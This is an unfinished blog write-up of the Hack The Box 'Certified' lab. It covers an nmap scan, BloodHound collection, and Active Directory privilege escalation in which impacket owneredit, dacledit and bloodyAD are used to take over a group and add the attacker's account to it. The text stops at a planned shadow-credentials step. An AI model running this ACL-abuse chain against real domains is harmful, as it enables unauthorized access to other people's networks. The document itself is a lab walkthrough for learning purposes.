---
title: Certified 
date: 2026-08-26 00:00:00 +0800 
categories: [HTB, Box]
image:
    path: certified.jpg
layout: post 
media_subpath: /assets/posts/certified
---

# HTB Certified - Medium

```terminal
Me > 10.10.14.74
Target > 10.129.231.186
```

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09

We start the box with some credentials.

## Foothold

Lets start with a nmap scan

```terminal
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-27 02:29:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-27T02:31:18+00:00; +6h58m13s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-27T02:31:17+00:00; +6h58m13s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-27T02:31:18+00:00; +6h58m13s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
|_ssl-date: 2026-08-27T02:31:17+00:00; +6h58m13s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49738/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-27T02:30:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h58m12s, deviation: 0s, median: 6h58m12s
```

Just looks like a normal domain controller. 

We can start collection bloodhound data. But first we can add the host names. 

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ sudo nxc smb 10.129.231.186 -u '' -p '' --generate-hosts-file /etc/hosts
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.186  445    DC01             [+] certified.htb\: 

┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ bloodhound-python -d 'certified.htb' -u 'judith.mader' -p 'judith09' -c All -ns 10.129.231.186

<REDACTED>

INFO: Done in 00M 32S
```

![Certified](c1.png)

We see that we have a attack path from judith.mader -> MANAGEMENT_SVC

Summary of the attack path.

Judith.mader has WriteOwner rights on the Management group (visible via BloodHound). She abuses this by first taking ownership of the group with owneredit, changing the owner from Domain Admins to herself -> then using dacledit to grant herself WriteMembers on the group, since owning an object lets you rewrite its DACL to add any permission -> then adding herself as a member of the group with bloodyAD, which now contains her alongside MANAGEMENT_SVC. The group has GenericWrite over MANAGEMENT_SVC

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.129.231.186
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
                                                                                                            
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.129.231.186
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20260827-121437.bak
[*] DACL modified successfully!
```

We also need to add ourselfs to the group

```terminal
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ bloodyad --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add groupMember Management judith.mader                                            
[+] judith.mader added to Management
                                                                                                                      
┌──(songbird㉿kali)-[~/Desktop/certified]
└─$ bloodyad --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 get object Management --attr member

distinguishedName: CN=Management,CN=Users,DC=certified,DC=htb
member: CN=management service,CN=Users,DC=certified,DC=htb; CN=Judith Mader,CN=Users,DC=certified,DC=htb
```

We can confirm we are in the group by the last bloodyad command. IMPORTANT there is a cron job running pretty often that reverts the change so if commands fail go back to the first impacket script and redo it.

![Certified](c2.png)

We see that we have as users in the Management group have GenericWrite over MANAGEMENT_SVC 

At first I tried a kerberoast attack but I could not crack the hash. Instead we are going for a shadow credentials attack 

Im going to finish writing this soon